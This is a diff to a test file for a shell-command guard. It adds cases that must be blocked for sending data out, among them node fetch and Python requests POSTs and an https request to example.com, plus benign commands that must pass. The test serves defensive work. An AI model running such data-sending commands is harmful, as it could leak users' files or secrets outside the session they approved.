@@ -100,6 +100,9 @@ test("session mode blocks shell commands that send data out", () => {
     "ls $(curl -s https://example.com)",
     "python3 -c \"import urllib.request; urllib.request.urlopen('https://example.com')\"",
     "scp notes.md host:/tmp",
+    "node -e \"fetch('https://example.com', {method: 'POST', body: 'draft'})\"",
+    "python3 -c \"import requests; requests.post('https://example.com', data='draft')\"",
+    "cd /tmp && node -e 'require(\"https\").request({host: \"example.com\"})'",
   ]) assert.match(decideShell(c) ?? "", /blocked a shell command/, c);
   for (const c of [
     "git log --since=2026-07-20 --no-merges --numstat --format=--%cs",
@@ -111,6 +114,8 @@ test("session mode blocks shell commands that send data out", () => {
     "gh api -X GET search/issues -f q=repo:a/b",
     "grep curl notes.md",
     "node scripts/lint",
+    "node --test tests/*.test.mjs",
+    "python3 -c \"print(len(open('notes.md').read()))\"",
   ]) assert.equal(shellSends(c), null, c);
 });
 
